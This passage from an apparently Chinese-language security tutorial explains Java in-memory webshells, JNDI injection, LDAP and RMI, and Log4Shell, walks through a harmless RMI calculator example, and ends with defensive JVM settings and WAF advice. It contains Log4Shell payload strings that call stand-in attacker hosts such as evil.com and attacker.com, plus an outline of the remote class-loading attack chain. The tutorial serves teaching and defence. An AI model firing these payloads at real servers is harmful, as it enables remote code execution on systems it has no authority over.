里，它通常表现为一个被动态加载到 JVM 内存中的恶意类，可以接收远程指令、执行任意命令或窃取敏感数据。</p><h2 id=内存马常见类别><strong>内存马常见类别</strong><a hidden class=anchor aria-hidden=true href=#内存马常见类别>#</a></h2><p>• Servlet 型：通过篡改或新增 Servlet、Filter、Listener 实现流量拦截与命令执行。
• Agent 型：利用 Java Instrumentation API 在运行时修改已有类的字节码，植入后门。
• 动态代理/反射型：通过 Proxy、InvocationHandler 或反射机制把恶意逻辑挂接到正常业务流程中。
• 代码执行型：借助脚本引擎（如 Nashorn、Groovy）把恶意脚本直接加载到内存并执行</p><h2 id=为什么会存在内存马><strong>为什么会存在内存马</strong><a hidden class=anchor aria-hidden=true href=#为什么会存在内存马>#</a></h2><p>根本原因在于 Java 的“动态性”：
• 类可以在运行时从网络、数据库或其他非文件源加载；
• 字节码可以被 Instrumentation API 在运行时修改；
• 反射和动态代理允许在不改动源码的前提下改变程序行为。
攻击者正是利用这些特性，把恶意代码“注入”到正在运行的 JVM 里，而不留下任何文件痕迹。</p><h2 id=java-架构如何助长内存马><strong>Java 架构如何助长内存马</strong><a hidden class=anchor aria-hidden=true href=#java-架构如何助长内存马>#</a></h2><p>• JVM 的类加载机制是“按需加载”，运行时可随时从任意来源读取字节码并定义成类；
• 运行时数据区（堆、方法区等）对动态生成的类和对象没有额外限制；
• “沙箱”模型只在早期 Applet 时代严格实施，现代服务器应用往往以全权模式运行，一旦获得 ClassLoader 或 Instrumentation 实例，就能突破信任边界。
因此，只要攻击者拿到能够动态加载或修改字节码的入口（如反序列化漏洞、JNDI 注入、Groovy 脚本执行等），就能把恶意逻辑直接塞进内存，形成无文件驻留。</p><p>一句话总结：内存马的本质是“把恶意代码当成普通 Java 类一样加载到内存并执行”，它之所以能成为“无文件”，正是因为 Java 的类加载、字节码改写和反射机制允许在不落地文件的前提下完成整个攻击链。</p><h2 id=一什么是jndi注入>一、什么是JNDI注入<a hidden class=anchor aria-hidden=true href=#一什么是jndi注入>#</a></h2><p><strong>JNDI为什么会成为黑客的工具</strong></p><h3 id=11-一句话区分>1.1 <strong>一句话区分：</strong><a hidden class=anchor aria-hidden=true href=#11-一句话区分>#</a></h3><p>JNDI 注入是黑客把“资源查找”这把正经钥匙，拧成了撬锁的铁丝。</p><h3 id=12-jndi注入的核心到底是什么>1.2 JNDI注入的核心到底是什么？<a hidden class=anchor aria-hidden=true href=#12-jndi注入的核心到底是什么>#</a></h3><p><strong>核心只有一句话：</strong></p><blockquote><p>攻击者能够<strong>控制传给 JNDI lookup() 的字符串</strong>，从而让受害者程序去加载并执行攻击者指定的恶意代码。</p></blockquote><p>换成大白话： 程序本来应该只查“jdbc/myDS”这种安全的名字，结果你让我查“ldap://evil.com/badclass”，我就真的去 evil.com 下载并执行那个坏类——这就中招了。</p><h4 id=解释-lookup-><strong>解释 lookup() ：</strong><a hidden class=anchor aria-hidden=true href=#解释-lookup->#</a></h4><ol><li>JNDI 本身不是黑客发明的，它是 JavaEE 里用来“按名字找资源”的一套标准 API，比如找数据库、远程对象、LDAP 条目等，初衷是让开发更方便。</li><li>JNDI 注入则是黑客发现：
• lookup() 的参数如果来自用户输入，就能被拼成恶意 URI（ldap://、rmi:// 等）；
• 目标服务器会乖乖去请求攻击者控制的目录服务；
• 返回的恶意 Reference 可触发远程类加载，最终在内存里执行任意代码。</li><li>因此，它并不是为解决某种问题而设计的“安全行为”，而是开发人员在使用 JNDI 时，对 lookup 字符串缺乏严格校验，被黑客逆向利用形成的安全漏洞。</li></ol><h3 id=13-为什么jndi会去加载远程的恶意类原理是怎么样的>1.3 为什么JNDI会去加载远程的恶意类？原理是怎么样的？<a hidden class=anchor aria-hidden=true href=#13-为什么jndi会去加载远程的恶意类原理是怎么样的>#</a></h3><p>关键在于 Java 的一个类：javax.naming.InitialContext 在 lookup 的时候，<strong>默认信任并自动反序列化</strong>某些协议返回的对象。</p><p>支持的危险协议（能加载远程代码的）主要有三个：</p><ol><li><strong>RMI</strong>（上面代码用的）</li><li><strong>LDAP</strong>（最常见、最危险，Log4Shell 就是这个）</li><li><strong>CORBA</strong>（已经基本废弃）</li></ol><p>其中 LDAP 最可怕，因为 LDAP 服务器可以直接返回一个包含 <strong>远程 class 文件 URL</strong> 的对象，Java 会自动去下载并执行那个 class 中的 static 代码块或者构造函数。</p><p>流程图（Log4Shell 最典型）：</p><pre tabindex=0><code>用户输入: ${jndi:ldap://evil.com/Exploit}
→ log4j 傻乎乎地把这行字符串交给 JNDI lookup
→ JNDI 去 evil.com 的 LDAP 服务问 &#34;Exploit 这个名字对应什么对象？&#34;
→ 恶意的 LDAP 服务器返回：这个对象是个 Java 类，类文件在 http://evil.com/Exploit.class
→ JVM 自动下载 Exploit.class 并实例化
→ Exploit.class 的 static {} 块或者构造函数里执行 Runtime.getRuntime().exec(&#34;calc.exe&#34;)
→ 服务器直接被弹计算器 / 挖矿 / 后门
</code></pre><h3 id=14-什么是按名字找资源>1.4 什么是按名字找资源<a hidden class=anchor aria-hidden=true href=#14-什么是按名字找资源>#</a></h3><h4 id=大白话解释>大白话解释<a hidden class=anchor aria-hidden=true href=#大白话解释>#</a></h4><p>想象一下，你去图书馆借一本名为《哈利·波特与魔法石》的书：</p><ol><li><strong>你提供名字</strong>：你告诉图书管理员书名，就像在电脑中输入资源的名称一样。</li><li><strong>图书管理员查找目录</strong>：图书管理员会查看图书馆的目录，找到这本书的编号和所在位置，就像电脑在内部查找资源的位置一样。</li><li><strong>图书管理员取书</strong>：根据目录信息，图书管理员去书架上找到这本书，然后交给你，就像电脑从指定位置读取资源并提供给你一样。</li></ol><h4 id=原理结合>原理结合<a hidden class=anchor aria-hidden=true href=#原理结合>#</a></h4><p>在计算机中，<strong>按名字找资源</strong>的过程类似：</p><ol><li><strong>资源命名</strong>：每个资源（如文件、数据库连接、网络服务等）都有一个唯一的名称，就像每本书都有一个书名。</li><li><strong>建立目录</strong>：操作系统或应用程序会维护一个资源目录，记录资源名称和实际位置的对应关系，就像图书馆的目录一样。</li><li>查找资源<ul><li><strong>你提供名称</strong>：在程序中，你通过名称请求资源，就像告诉图书管理员书名。</li><li><strong>系统查找目录</strong>：系统根据你提供的名称，在资源目录中查找对应的实际位置。</li><li><strong>获取资源</strong>：系统从找到的位置读取资源，并提供给程序使用。</li></ul></li></ol><h4 id=简单例子说明>简单例子说明<a hidden class=anchor aria-hidden=true href=#简单例子说明>#</a></h4><ul><li><h5 id=文件资源你在电脑上打开一个名为-reportdocx-的文件操作系统会根据文件名在硬盘上找到对应的文件内容><strong>文件资源</strong>：你在电脑上打开一个名为 <code>report.docx</code> 的文件，操作系统会根据文件名在硬盘上找到对应的文件内容。<a hidden class=anchor aria-hidden=true href=#文件资源你在电脑上打开一个名为-reportdocx-的文件操作系统会根据文件名在硬盘上找到对应的文件内容>#</a></h5></li><li><p><strong>数据库连接</strong>：在程序中，你使用名称 <code>jdbc/MyDatabase</code> 获取数据库连接，JNDI 会查找目录，找到实际的数据库连接信息并返回给你。</p></li></ul><h5 id=再次打个最简单的比喻><strong>再次打个最简单的比喻：</strong><a hidden class=anchor aria-hidden=true href=#再次打个最简单的比喻>#</a></h5><p>​ 你去星巴克点咖啡，你不会直接冲进后厨找咖啡豆吧？你会对服务员说：“我要一杯美式”。 服务员（前台）就去后厨给你拿——这个“服务员+菜单”就是 JNDI。</p><p>在Java世界里，很多资源都有名字：</p><ul><li>数据库连接池叫 “jdbc/myDS”</li><li>队列叫 “jms/myQueue”</li><li>远程对象（RMI）叫 “rmi://ip:1099/AddService”</li></ul><p>程序只需要说：“给我 jdbc/myDS 这个东西”，JNDI 就负责帮你去找、创建、返回真正的对象。</p><p>所以 JNDI 本来是<strong>为了让程序更灵活、更容易配置</strong>而生的，程序员不用硬编码 IP、端口、驱动类名，只要改配置文件就行。</p><h5 id=总结>总结<a hidden class=anchor aria-hidden=true href=#总结>#</a></h5><p><strong>按名字找资源</strong>的核心是：</p><ul><li><strong>命名</strong>：给资源起一个唯一的名字。</li><li><strong>目录</strong>：建立资源名称与实际位置的映射关系。</li><li><strong>查找</strong>：根据名称在目录中查找，获取资源。</li></ul><h2 id=二什么是ldap和rmi协议>二、什么是LDAP和RMI协议<a hidden class=anchor aria-hidden=true href=#二什么是ldap和rmi协议>#</a></h2><p>ldap:// 和 rmi:// 就像 http:// 一样，都是一串“协议前缀”，用来告诉程序“接下来要用哪种协议去访问资源”。</p><ol><li>ldap://
相当于“目录查询专用浏览器”。
例：ldap://192.168.1.100:389/dc=company,dc=com
意思是“用 LDAP 协议去 192.168.1.100 这台目录服务器的 389 端口，查找 company.com 这个范围下的条目”。
它不传网页，而是传“用户、部门、权限”这类结构化信息。</li><li>rmi://
相当于“远程对象调用专线”。
例：rmi://192.168.1.200:1099/Calculator
意思是“用 RMI 协议去 192.168.1.200 的 1099 端口，调用名叫 Calculator 的远程对象”。
它不传网页，而是让本地程序像调用本地方法一样执行远程对象的方法。</li></ol><p>与 HTTP 的异同</p><ul><li>相同：都用“协议://地址:端口/路径”的格式，都是通过网络获取东西。</li><li>不同：
– HTTP 拿的是网页、图片、JSON 等数据；
– LDAP 拿的是目录条目（用户、组、权限）；
– RMI 拿的是可远程调用的对象句柄。</li></ul><h2 id=三远程加法计算器例子>三、远程加法计算器例子<a hidden class=anchor aria-hidden=true href=#三远程加法计算器例子>#</a></h2><p>我们用“远程加法计算器”这个例子，把 RMI 拆成三步：</p><ol><li>定义“能远程调用的功能”——就像贴出一份“我能干啥”的告示；</li><li>服务器把真正的计算方法挂在网上；</li><li>客户端拿着告示去远程找服务器算结果。</li></ol><h3 id=第一步写一张告示接口>第一步：写一张“告示”（接口）<a hidden class=anchor aria-hidden=true href=#第一步写一张告示接口>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// 告示：只要谁能提供 add 方法，就可以远程调用</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>interface</span> <span style=color:#a6e22e>AddServerIntf</span> <span style=color:#66d9ef>extends</span> java.<span style=color:#a6e22e>rmi</span>.<span style=color:#a6e22e>Remote</span> {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 接收两个 double，返回和；可能抛 RemoteException</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>double</span> <span style=color:#a6e22e>add</span>(<span style=color:#66d9ef>double</span> a, <span style=color:#66d9ef>double</span> b) <span style=color:#66d9ef>throws</span> java.<span style=color:#a6e22e>rmi</span>.<span style=color:#a6e22e>RemoteException</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><ul><li>第 1 行：<code>interface</code> 就是贴一张“告示”，告诉别人“我能干啥”。</li><li>第 2 行：<code>extends java.rmi.Remote</code> 意思是“这张告示是允许远程调用的”。</li><li>第 3 行：<code>double add(...)</code> 告诉别人“我能把两个小数相加，并把结果返回”。</li><li><code>throws RemoteException</code>：远程调用可能出网络问题，所以提前说“如果出错，我会抛异常”。</li></ul><hr><h3 id=第二步服务器真正的计算器>第二步：服务器（真正的计算器）<a hidden class=anchor aria-hidden=true href=#第二步服务器真正的计算器>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// 真正的加法器</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>AddServerImpl</span> <span style=color:#66d9ef>extends</span> java.<span style=color:#a6e22e>rmi</span>.<span style=color:#a6e22e>server</span>.<span style=color:#a6e22e>UnicastRemoteObject</span> 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>implements</span> AddServerIntf {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 必须有默认构造函数，且抛 RemoteException</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#a6e22e>AddServerImpl</span>() <span style=color:#66d9ef>throws</span> java.<span style=color:#a6e22e>rmi</span>.<span style=color:#a6e22e>RemoteException</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>super</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 实现告示里的 add 方法</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>double</span> <span style=color:#a6e22e>add</span>(<span style=color:#66d9ef>double</span> a, <span style=color:#66d9ef>double</span> b) <span style=color:#66d9ef>throws</span> java.<span style=color:#a6e22e>rmi</span>.<span style=color:#a6e22e>RemoteException</span> {
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;服务器正在计算 &#34;</span> <span style=color:#f92672>+</span> a <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; + &#34;</span> <span style=color:#f92672>+</span> b);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> a <span style=color:#f92672>+</span> b;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 1. 启动 RMI registry（相当于一个“黄页”服务）</span>
</span></span><span style=display:flex><span>            java.<span style=color:#a6e22e>rmi</span>.<span style=color:#a6e22e>registry</span>.<span style=color:#a6e22e>LocateRegistry</span>.<span style=color:#a6e22e>createRegistry</span>(1099);
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 2. 把我们的加法器实例注册到黄页，取名叫 &#34;AddService&#34;</span>
</span></span><span style=display:flex><span>            AddServerIntf stub <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> AddServerImpl();
</span></span><span style=display:flex><span>            java.<span style=color:#a6e22e>rmi</span>.<span style=color:#a6e22e>Naming</span>.<span style=color:#a6e22e>rebind</span>(<span style=color:#e6db74>&#34;AddService&#34;</span>, stub);
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;服务器已启动，等待客户端调用...&#34;</span>);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Exception e) {
</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><ul><li>第 1 行：<code>class AddServerImpl</code> 就是“真正的计算器”。</li><li>第 2 行：<code>extends UnicastRemoteObject</code> 意思是“我把自己变成能远程访问的对象”。</li><li>第 3 行：<code>implements AddServerIntf</code> 意思是“我按照告示上的内容，把真正的加法逻辑写在这里”。</li><li>第 4-6 行：构造方法，告诉 JVM“我需要远程能力，所以调用 super()”。</li><li>第 7-9 行：真正的加法逻辑，跟普通 Java 方法一样，只是多抛了一个 RemoteException。</li><li>第 10-14 行：<code>main</code>方法就是“把计算器挂到网上”。<ul><li>第 11 行：先 new 一个计算器实例。</li><li>第 12 行：<code>Naming.rebind(...)</code> 相当于把计算器注册到“电话簿”（RMI Registry），名字叫 <code>AddServer</code>，别人只要查这个名字就能找到它。</li><li>第 13 行：打印“服务已启动”，表示挂好了。</li></ul></li></ul><hr><h3 id=第三步客户端远程调用者>第三步：客户端（远程调用者）<a hidden class=anchor aria-hidden=true href=#第三步客户端远程调用者>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>AddClient</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 1. 找到服务器的黄页（假设服务器在 192.168.1.100）</span>
</span></span><span style=display:flex><span>            String url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;rmi://192.168.1.100:1099/AddService&#34;</span>;
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 2. 从黄页里取出名为 &#34;AddService&#34; 的远程对象</span>
</span></span><span style=display:flex><span>            AddServerIntf stub <span style=color:#f92672>=</span> (AddServerIntf) java.<span style=color:#a6e22e>rmi</span>.<span style=color:#a6e22e>Naming</span>.<span style=color:#a6e22e>lookup</span>(url);
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 3. 像调用本地方法一样调用远程方法</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>double</span> result <span style=color:#f92672>=</span> stub.<span style=color:#a6e22e>add</span>(3.<span style=color:#a6e22e>5</span>, 4.<span style=color:#a6e22e>2</span>);
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;远程计算结果: &#34;</span> <span style=color:#f92672>+</span> result);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Exception e) {
</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><ul><li>第 1-2 行：<code>main</code> 方法就是“远程调用者”。</li><li>第 3 行：<code>Naming.lookup(...)</code> 相当于去“电话簿”里查名字叫 <code>AddServer</code> 的计算器。</li><li>第 4 行：拿到计算器后，直接调用 <code>add(3.0, 5.0)</code>，就像调用本地方法一样。</li><li>第 5 行：打印结果，看到 <code>3 + 5 = 8.0</code>。</li></ul><hr><p>一句话总结</p><ol><li>告示（接口）：告诉别人“我能远程加法”。</li><li>服务器：把真正的加法器挂到网上。</li><li>客户端：去网上查名字，拿到计算器，直接调用，就像本地一样。</li></ol><p><strong>原理</strong>：</p><ul><li><code>lookup</code> 就是去黄页里按名字找“谁能提供 add”；</li><li>找到后返回一个“代理”（stub），它看起来像本地对象，实际内部会把参数打包、发到网络、等服务器返回结果；</li><li>整个过程对程序员透明，就像调用本地方法一样。</li></ul><hr><p>一句话总结
RMI 就是“把本地对象搬到网上，让别人像调用本地方法一样调用远程方法”，中间的打包、发包、解包、回包都由 RMI 框架自动完成。</p><h2 id=四补充>四、补充：<a hidden class=anchor aria-hidden=true href=#四补充>#</a></h2><h2 id=41-为什么这么好的技术会被黑客利用时间线简单说一下>4.1 为什么这么好的技术会被黑客利用？时间线简单说一下<a hidden class=anchor aria-hidden=true href=#41-为什么这么好的技术会被黑客利用时间线简单说一下>#</a></h2><p>2015-2016 年左右，安全研究员就发现 JNDI + LDAP/RMI 可以远程加载代码</p><p>2016 年 Jenkins、WebLogic 等很多知名中间件被爆 JNDI 注入漏洞（就是用户能控制 lookup 的名字）</p><p>2021年12月 Log4Shell（log4j2）彻底引爆全世界，因为几乎所有 Java 项目都用了 log4j，而且日志会直接打印用户输入，等于用户一句话就能触发 JNDI 注入</p><p>到现在（2025年），JNDI 注入仍然是 Java 应用中最常见的严重漏洞之一。</p><h2 id=42--黑客到底是怎么实际利用的真实攻击链>4.2 黑客到底是怎么实际利用的？（真实攻击链）<a hidden class=anchor aria-hidden=true href=#42--黑客到底是怎么实际利用的真实攻击链>#</a></h2><p><strong>1.找到一个能控制 JNDI lookup 参数的地方（常见入口）：</strong></p><ul><li>日志（Log4Shell）</li><li>HTTP Header（如 User-Agent、X-Forwarded-For）</li><li>URL 参数、JSON 参数</li><li>WebLogic 的 T3/IIOP 协议、各种反序列化点</li></ul><p><strong>2.构造 payload（最经典的）：</strong></p><pre tabindex=0><code>${jndi:ldap://attacker.com/a}
${jndi:rmi://attacker.com/a}
</code></pre><p><strong>3.攻击者在自己的 VPS 上</strong>：</p><ul><li>启动恶意 LDAP 服务器（用 marshalsec、rogue-jndi 等工具，几行命令就行）</li><li>放一个恶意的 Exploit.class（里面执行 calc.exe 或反弹 shell）</li></ul><p>4.受害者服务器一收到 payload → 自动去下载并执行 → 中招</p><h2 id=43-几个关键点非常重要>4.3 几个关键点（非常重要！）<a hidden class=anchor aria-hidden=true href=#43-几个关键点非常重要>#</a></h2><table><thead><tr><th>你可能忽略的点</th><th>解释</th></tr></thead><tbody><tr><td>即使你没有用 log4j，只要程序里有 <code>new InitialContext().lookup(userInput)</code> 就可能中招</td><td>很多老项目、各种框架都自己写了 JNDI 查询</td></tr><tr><td>默认情况下，JDK 8u191 之后已经禁掉了远程 class 加载（com.sun.jndi.ldap.object.trustURLCodebase=false）</td><td>但很多老系统还是 JDK8u181 之前，或者手动把这个参数改回来了</td></tr><tr><td>RMI 也可以触发（上面代码就是），只是没有 LDAP 那么方便</td><td>2023-2024 年还有很多 RMI 注入漏洞被挖</td></tr><tr><td>即使禁掉了远程代码加载，仍然可能有反序列化 Gadget 链</td><td>YSOSerial 的 gadget 可以直接在本地触发危险操作</td></tr><tr><td>Spring、Jackson、Fastjson 等反序列化漏洞很多时候也会间接触发 JNDI</td><td>它们在反序列化时会走到 JNDI lookup</td></tr></tbody></table><h2 id=总结给小白的防jndi注入口诀>总结（给小白的防JNDI注入口诀）<a hidden class=anchor aria-hidden=true href=#总结给小白的防jndi注入口诀>#</a></h2><ol><li><p><strong>永远不要把用户输入直接交给 InitialContext.lookup() 或 Naming.lookup()</strong></p></li><li><p>如果一定要用，设置以下 JVM 参数（强烈推荐）：</p><pre tabindex=0><code>-Dcom.sun.jndi.rmi.object.trustURLCodebase=false
-Dcom.sun.jndi.ldap.object.trustURLCodebase=false
-Dcom.sun.jndi.cosnaming.object.trustURLCodebase=false
</code></pre></li></ol><p>3.升级到最新 JDK（JDK 11+、17+ 默认已经禁掉远程加载）</p><p>4.用 WAF 或日志监控拦截 ${jndi: 这类特征</p><h2 id=完整源码>完整源码<a hidden class=anchor aria-hidden=true href=#完整源码>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// ===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 文件名：AddServerWithFullComments.java</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 作用：完整的 Java RMI + JNDI 示例，带超级详细的逐行中文注释</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 适合：Java 小白 + 刚学网络安全的同学</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 警告：这个代码本身是教学用的，但演示了 JNDI 注入的原理！</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//       生产环境绝对不要把用户输入直接给 lookup() 用！！！</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// ===============================================================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.Remote;                      <span style=color:#75715e>// Remote 是所有远程接口必须继承的标记接口</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.RemoteException;           <span style=color:#75715e>// 远程方法必须抛出的异常</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.server.UnicastRemoteObject; <span style=color:#75715e>// 实现远程对象时要继承的父类</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.registry.LocateRegistry;    <span style=color:#75715e>// 用于创建本地 RMI 注册中心（黄页）</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.Naming;                     <span style=color:#75715e>// 用来绑定和查找远程对象（旧 API，但经典）</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 第一部分：远程接口（相当于“服务合同、告示”）</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 只要谁实现了这个接口并注册，就允许别人远程调用 add 方法</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>interface</span> <span style=color:#a6e22e>AddServerIntf</span> <span style=color:#66d9ef>extends</span> Remote {  <span style=color:#75715e>// 必须继承 java.rmi.Remote</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 定义一个远程方法：接收两个 double，返回它们的和</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 所有远程方法都必须声明 throws RemoteException（因为网络可能出问题）</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>double</span> <span style=color:#a6e22e>add</span>(<span style=color:#66d9ef>double</span> a, <span style=color:#66d9ef>double</span> b) <span style=color:#66d9ef>throws</span> RemoteException;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 第二部分：远程对象的真正实现类</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>AddServerImpl</span> <span style=color:#66d9ef>extends</span> UnicastRemoteObject 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>implements</span> AddServerIntf {   <span style=color:#75715e>// 必须同时继承 UnicastRemoteObject 并实现上面的接口</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 必须提供一个（可以是 protected）构造函数，并且要抛 RemoteException</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 为什么？因为 UnicastRemoteObject 的构造函数会抛这个异常</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#a6e22e>AddServerImpl</span>() <span style=color:#66d9ef>throws</span> RemoteException {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>super</span>();                <span style=color:#75715e>// 调用父类 UnicastRemoteObject 的无参构造函数</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// super() 这行可以省略，但写出来更清晰</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 真正实现加法逻辑</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>double</span> <span style=color:#a6e22e>add</span>(<span style=color:#66d9ef>double</span> a, <span style=color:#66d9ef>double</span> b) <span style=color:#66d9ef>throws</span> RemoteException {
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;【服务器端】正在计算 &#34;</span> <span style=color:#f92672>+</span> a <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; + &#34;</span> <span style=color:#f92672>+</span> b);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 这里可以写任意复杂逻辑，客户端调用时就会在服务器机器上执行</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> a <span style=color:#f92672>+</span> b;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// ==================== 服务器启动入口 ====================</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 第1步：在本机 1099 端口启动一个 RMI 注册中心（相当于“电话黄页”）</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 如果这行不执行，客户端就找不到服务（会报 Connection refused）</span>
</span></span><span style=display:flex><span>            LocateRegistry.<span style=color:#a6e22e>createRegistry</span>(1099);
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;RMI 注册中心已在 1099 端口启动成功&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 第2步：创建远程对象实例（这一步会自动生成一个“stub”存根对象）</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// stub 是客户端真正拿到的“代理”，它负责把方法调用通过网络发给服务器</span>
</span></span><span style=display:flex><span>            AddServerImpl impl <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> AddServerImpl();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 第3步：把这个服务用名字 &#34;AddService&#34; 绑定到注册中心</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 绑定后，别人就可以通过名字找到它</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// rebind 的意思是：如果名字已存在就覆盖（bind 是如果存在就报错）</span>
</span></span><span style=display:flex><span>            Naming.<span style=color:#a6e22e>rebind</span>(<span style=color:#e6db74>&#34;AddService&#34;</span>, impl);
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 完整的绑定名字其实是：rmi://localhost:1099/AddService</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 但在本机可以省略 ip 和端口</span>
</span></span><span style=display:flex><span>
